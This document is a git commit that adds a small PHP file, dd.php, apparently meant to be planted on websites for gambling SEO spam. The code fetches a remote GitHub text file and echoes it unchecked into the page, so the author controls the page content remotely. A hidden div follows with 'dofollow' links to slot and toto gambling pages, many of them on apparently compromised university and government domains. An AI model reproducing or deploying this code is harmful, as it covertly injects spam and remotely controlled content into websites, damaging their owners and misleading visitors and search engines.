32e929f24b805e358b46d481c78af68ae2d49ecc
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2023-12-15 08:50:25 +0800

    Create dd.php

---
+++ dd.php
@@ -0,0 +1,24 @@
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
+?>
+<div style="display:none;">
+<a href="https://situs-toto.amikpgrikebumen.ac.id/" rel="dofollow">situs toto</a>
+<a href="https://mesy.uika-bogor.ac.id/store/gates-of-olympus/" rel="dofollow">gates of olympus</a>
+<a href="https://mesy.uika-bogor.ac.id/store/deposit-pulsa-tanpa-potongan/" rel="dofollow">slot deposit pulsa tanpa potongan</a>
+<a href="https://daftar.upbatam.ac.id/uploads/2023/" rel="dofollow">slot thailand</a>
+<a href="https://daftar.upbatam.ac.id/uploads/2022/" rel="dofollow">slot dana</a>
+<a href="https://mi.unisbank.ac.id/" rel="dofollow">situs toto</a>
+<a href="https://baronbudd.net/" rel="dofollow">situs toto</a>
+<a href="https://fao.balinkbayan.gov.ph/" rel="dofollow">idn slot</a>
+<a href="http://thenewage.net.au/" rel="dofollow">slot777</a>
+<a href="https://info-data.itenas.ac.id/public/assets/situs-toto/" rel="dofollow">situs toto</a>
+<a href="https://info-data.itenas.ac.id/public/assets/slot5k/" rel="dofollow">slot depo 5k</a>
+<a href="https://info-data.itenas.ac.id/public/assets/idnslot/" rel="dofollow">idn slot</a>
+<a href="https://info-data.itenas.ac.id/public/assets/danatoto/" rel="dofollow">dana toto</a>
+<a href="https://info-data.itenas.ac.id/public/assets/demo/" rel="dofollow">slot demo</a>
+</div>
